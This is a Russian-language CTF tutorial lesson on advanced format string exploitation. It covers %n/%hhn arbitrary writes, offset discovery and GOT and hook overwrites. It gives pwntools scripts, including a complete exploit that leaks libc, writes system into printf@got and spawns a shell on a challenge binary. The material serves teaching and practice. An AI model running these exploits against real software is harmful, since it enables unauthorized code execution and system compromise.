Format string advanced — это переход от утечек к полноценной произвольной записи. Базовый урок показывает `%p`/`%s`, здесь мы разбираем `%n`, `%hn`, `%hhn`, позиционную запись, обход фильтров, захват GOT, перезапись хуков и возвратных адресов, а также автоматизацию через `fmtstr_payload` и `FmtStr`. Произвольная запись — самый мощный userland-примитив: одна удачная запись `system` в GOT превращает уязвимость в RCE. Разберём полный процесс от поиска смещения до стабильного эксплойта.

## Спецификаторы записи

`%n` записывает в память число уже выведенных символов. Модификаторы задают ширину записи: `%hhn` — 1 байт, `%hn` — 2 байта, `%n` — 4 байта (на x86-64 `%n` пишет 4 байта, `%ln` — 8). Поскольку `%n` пишет число выведенных байт, чтобы записать значение `V`, нужно вывести ровно `V` символов (обычно через `%Vc`) и затем вызвать `%n` по нужному адресу. Прямая запись больших чисел медленна и порождает огромный вывод, поэтому на практике пишут побайтово через `%hhn`, размещая 4–8 адресов в начале строки.

| Спецификатор | Ширина записи | Применение |
|---|---|---|
| `%hhn` | 1 байт | побайтовая запись (основной приём) |
| `%hn` | 2 байта | компромисс |
| `%n` | 4 байта | редко, при малых значениях |
| `%ln` | 8 байт | x86-64, очень редко |

## Поиск смещения

Сначала найдите позицию, на которой начинается ваш буфер. Подайте метку и переберите позиции:

```python
from pwn import *
p = process('./chall')
p.sendline(b'AAAA' + b'.%p' * 30)
out = p.recvline()
print(out)
# найдите позицию, где появляется 0x41414141 — это offset
```

Если `AAAA` видно на позиции 6, то `%6$p` читает первые 4 байта буфера, а `%6$n` запишет по адресу из этих байтов. На amd64 первые шесть «аргументов» приходят из регистров-сейв-области `printf`, поэтому позиция вашего буфера обычно 6–8, но зависит от компилятора.

## Побайтовая запись через %hhn

Чтобы записать 8-байтовый адрес, размещаем 8 адресов (по одному на байт) и пишем в каждый нужный байт. Значения выводятся по возрастанию, поэтому `%hhn` пишет младшие байты числа выведенных символов. Схема:

```python
from pwn import *
context.binary = elf = ELF('./chall')
target = elf.got['printf']
value  = libc.symbols['system'] + libc.address
# адреса: target+0, target+1, ...
addrs = b''.join(p64(target + i) for i in range(8))
payload = addrs
written = len(addrs)
for i in range(8):
    want = (value >> (8 * i)) & 0xff
    pad = (want - written) % 256
    payload += f'%{pad}c%{6 + i}$hhn'.encode()
    written += pad
p.sendline(payload)
```

Позиция `6+i` соответствует `i`-му адресу в буфере (если offset = 6). Такой payload пишет 8 байт `system` в GOT `printf`.

## fmtstr_payload и FmtStr

pwntools автоматизирует сборку:

```python
from pwn import *
payload = fmtstr_payload(offset, {elf.got['printf']: libc.address + libc.symbols['system']},
                         numbwritten=0, write_size='byte')
p.sendline(payload)
```

Параметры: `offset` — позиция буфера; словарь `{addr: value}` — что записать; `numbwritten` — сколько символов уже выведено до payload (если программа печатает приглашение); `write_size` — `'byte'|'short'|'int'`. Для полностью автоматического поиска offset используйте `FmtStr`:

```python
def exec_fmt(payload):
    p = process('./chall')
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
log.info('offset = %d', offset)
payload = fmtstr_payload(offset, {elf.got['printf']: system})
```

`FmtStr` сам подбирает позицию, что экономит время.

## Захват GOT и перезапись хуков

Классическая цель — `printf@got`: если заменить `printf` на `system`, то следующий `printf(buf)` выполнит `system(buf)`, и подав `"/bin/sh"`, вы получите shell. На glibc до 2.34 отличные цели — `__free_hook`/`__malloc_hook`: записав туда `system` и вызвав `free("/bin/sh")`, получаете shell. После 2.34 хуки удалены, поэтому используют `_IO_2_1_stdout_`/FSOP или `.fini_array` (см. соответствующие уроки). Также можно перезаписать сохранённый адрес возврата на стеке — если вы знаете его адрес (через `environ`).

## Полный эксплойт: printf@got -> system

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

def start():
    return process('./chall') if not args.REMOTE else remote('host', 1337)

p = start()
# 1) утечка libc через printf@got или %p
p.sendline(b'%7$s' + p64(elf.got['printf']))
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['printf']
log.success('libc @ %#x', libc.address)

# 2) запись system в printf@got
p.sendline(fmtstr_payload(7, {elf.got['printf']: libc.address + libc.symbols['system']}))

# 3) следующий printf -> system
p.sendline(b'/bin/sh\x00')
p.interactive()
```

Здесь важно согласовать `offset` с реальной позицией буфера и учесть уже выведенные символы через `numbwritten`.

## Обход фильтров

Фильтры встречаются часто. Приёмы: (1) запрет `%` — уязвимости нет, ищите другой примитив; (2) запрет `n` — используйте только чтение (`%p`, `%s`); (3) ограничение длины — пишите побайтово и сокращайте payload, размещая адреса компактно; (4) фильтр на `$` — используйте последовательные `%p` вместо позиционных; (5) фильтр на нулевые байты — размещайте адреса так, чтобы нули не обрывали строку (например, пишите только младшие байты). Иногда помогает `%%` для вывода литерального `%`.

## Частые ошибки

- **Неверный offset.** Перепроверяйте после смены payload.
- **Забытый numbwritten.** Приглашение программы уже вывело символы — учитывайте их.
- **Порядок байт.** Адреса в payload идут в порядке записи; значения должны возрастать.
- **`%n` пишет 4 байта.** Для одного байта используйте `%hhn`, иначе затрёте соседнюю память.
- **Full RELRO.** GOT read-only — цельтесь в `.fini_array`/`__exit_funcs`.
- **Огромный вывод.** `%1000000c` замедлит и оборвёт вывод — пишите побайтово.

## Справочные таблицы

| Функция pwntools | Параметры |
|---|---|
| `fmtstr_payload(off, {a: v})` | offset, словарь адрес→значение |
| `FmtStr(exec_fmt)` | авто-поиск offset |
| `write_size` | `byte`/`short`/`int` |
| `numbwritten` | уже выведено символов |

| Цель записи | Когда | Заменяет |
|---|---|---|
| `printf@got` | Partial RELRO | `printf` → `system` |
| `__free_hook` | glibc < 2.34 | `free` → `system` |
| `__malloc_hook` | glibc < 2.34 | `malloc` → one_gadget |
| `.fini_array` | Full RELRO | вызов при exit |
| saved RIP | есть адрес стека | возврат в ROP |

## Что дальше / решение

Дальше: `pwn-format-string` (базовые утечки), `pwn-got-plt` (цели записи), `pwn-environ-leak` (адрес стека для перезаписи RIP), `pwn-fsop`/`pwn-exit-handlers` (обход Full RELRO), `pwn-glibc-mitigations` (что закрыто в новых glibc). Практический алгоритм: (1) найдите offset через `%p`-перебор или `FmtStr`; (2) утеките libc/PIE/стек; (3) выберите цель (`printf@got`, хук, `.fini_array`); (4) соберите `fmtstr_payload`; (5) триггерните вызов (следующий `printf`/`free`/`exit`); (6) подайте `"/bin/sh"`. Освоив произвольную запись, вы закрываете большинство format string задач.
## Запись на стек и возврат в ROP

Помимо GOT, format string позволяет перезаписывать сохранённые адреса возврата на стеке. Адрес цели вы получаете через утечку `environ` (см. `pwn-environ-leak`), после чего записываете туда адрес ROP-цепочки. Это особенно полезно, когда GOT защищён Full RELRO, а `_IO`-цели недоступны. Техника: найдите в gdb адрес сохранённого `rip` (например, `p &*(void**)($rsp+offset)`), вычислите его из `environ`-утечки, затем `fmtstr_payload(off, {saved_rip: rop_addr})`. Учтите, что стек содержит нулевые байты, поэтому `%s` может обрываться — используйте позиционный `%N$p` для утечки и побайтовую запись для модификации. Так format string превращается в полный контроль над потоком выполнения без единой перезаписи GOT.

## Одновременная запись нескольких целей

`fmtstr_payload` умеет писать сразу в несколько адресов — передайте словарь с несколькими парами. Это нужно, например, когда для shell требуется записать `system` в GOT и одновременно подготовить строку `"/bin/sh"` в записываемой памяти (или перезаписать две записи GOT). Порядок адресов в payload определяется сортировкой по значениям байтов: pwntools сам выстраивает их так, чтобы число выведенных символов монотонно росло. Если вы пишете вручную, помните, что `%hhn` записывает младший байт текущего счётчика, поэтому байты должны идти в порядке неубывания, а «перескоки» компенсируются `%Nc`-паддингом. При нескольких целях контролируйте, что адреса не пересекаются и не портят друг друга.

## Взаимодействие с частичной перезаписью и one_gadget

Когда известна база libc, но нет полной произвольной записи, используйте частичную: перезапишите только младшие байты сохранённого адреса возврата, направив его на `one_gadget`. Это требует выполнения условий one-gadget на регистрах, поэтому сначала проверьте их в gdb (`info registers`). Если условия не выполняются, найдите гаджет-«затравку», который обнуляет нужные регистры, и запишите его адрес. Формат-строка даёт возможность писать по произвольному адресу, а one-gadget — короткий путь к shell; комбинация часто используется в задачах с Partial RELRO и небольшим числом вводов. Не забывайте про выравнивание стека и порядок байт при частичной перезаписи (младшие два байта адреса).

## Итог: выбор цели под конкретную защиту

Формат-строка даёт произвольную запись, но её применение зависит от митигаций: при Partial RELRO пишите в GOT, при Full RELRO — в `.fini_array` или `__exit_funcs`, на glibc < 2.34 — в хуки, на новых версиях — в структуры `_IO_FILE`. Всегда уточняйте версию libc и состояние RELRO перед выбором. Помните, что одна и та же уязвимость может дать и чтение, и запись, поэтому сначала используйте `%s`/`%p` для разведки, а `%n` — для финального удара.
